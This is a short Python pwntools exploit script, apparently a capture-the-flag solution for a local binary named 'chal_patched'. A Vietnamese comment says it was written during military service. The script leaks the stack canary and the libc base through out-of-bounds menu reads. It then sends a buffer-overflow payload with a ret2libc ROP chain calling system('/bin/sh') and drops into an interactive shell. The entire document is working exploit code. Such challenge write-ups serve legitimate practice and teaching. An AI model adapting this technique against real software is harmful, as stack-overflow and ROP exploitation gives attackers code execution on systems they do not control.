#!/usr/bin/python3
# Làm hồi đi quân sự mà quên lưu lại trên github :D 
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./chal_patched') 
context.log_level = "debug"
libc = ELF('./libc.so.6')
p = process('./chal_patched') 

def casual(a: int, b: int, c: int) -> None: 
    p.sendlineafter(b'> ', str(a).encode())
    p.sendlineafter(b'> ', str(b).encode()) 
    p.sendlineafter(b'> ', str(c).encode())
    return None 

# Leak canary  
for i in range(3):
    casual(1, 1, 1)
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
# rbp - 0x68 - 12 * 0x8 = rbp - 0x8 = canary 
p.sendlineafter(b'> ', b'7') 
p.recvuntil('for ')
canary = int(p.recvuntil('G')[:-1]) 
log.info("Canary: " + hex(canary))

# Leak libc 
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'22') 
p.recvuntil('for ')
libc_base = int(p.recvuntil('G')[:-1]) - 171584
log.info("Libc base: " + hex(libc_base))

# Exploit 
system = libc_base + libc.symbols["system"]
pop_rdi = libc_base + 0x000000000002a3e5
ret = libc_base + 0x0000000000029139
bin_sh = libc_base + 0x00000000001d8678
payload = b'A' * 0x68 + p64(canary) + b'A' * 0x8 
payload += p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
p.sendlineafter(b'> ', b'3')
p.sendafter(b'share: \n', payload) 
p.interactive()
